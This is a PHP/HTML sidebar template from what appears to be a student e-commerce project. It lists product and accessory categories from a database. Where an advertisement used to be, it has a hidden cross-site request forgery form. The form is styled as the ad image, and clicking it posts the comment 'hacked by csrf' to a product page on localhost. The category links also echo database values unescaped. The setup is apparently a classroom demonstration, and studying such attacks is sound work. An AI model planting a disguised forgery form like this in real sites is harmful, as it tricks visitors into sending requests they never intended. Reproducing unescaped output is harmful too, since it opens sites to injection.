<div id="danhmucsp">
	<div class="center">
		<h4>SẢN PHẨM</h4>
		<?php
		$sql = "SELECT * FROM theloai WHERE dequi=1";
		$result = mysqli_query($con, $sql);
		?>
		<ul>
			<?php
			while ($row = mysqli_fetch_array($result)) {
			?>
				<li><a href="index.php?madm=<?php echo $row['id_tl']; ?>"><?php echo $row['ten_tl']; ?></a></li>
			<?php
			}
			?>
		</ul>
	</div>
</div>
<div id="phukien">
	<div class="center">
		<h4>PHỤ KIỆN</h4>
		<?php
		$sql = "SELECT * FROM theloai WHERE dequi=2";
		$result = mysqli_query($con, $sql);
		?>
		<ul>
			<?php
			while ($row = mysqli_fetch_array($result)) {
			?>
				<li><a href="index.php?madm=<?php echo $row['id_tl']; ?> "><?php echo $row['ten_tl']; ?></a></li>
			<?php
			}
			?>
		</ul>
	</div>
</div>
<!-- <div id="quangcao">
	<div class="center">
	<a href=""><img src="anh/qc1.png" alt="quangcao" title="Quảng cáo"></a>
	</div>
</div> -->

<form action="http://localhost:8080/Lopthu3_Tiet12345_Nhom8/do_an/index.php?act=ctsp&idsp=63" id="quangcao" method="post">
	<div class="center">
		<input type="text" name="name" id="name" value="csrf" style="display: none"><br>
		<textarea name="comment" id="comment" style="display: none">hacked by csrf</textarea><br>
		<input type="submit" name="submit" value="" style="width: 100%; height: 300px; cursor: pointer; background-color: transparent; background-repeat: no-repeat; background-image: url('anh/qc1.png');">
	</div>
</form>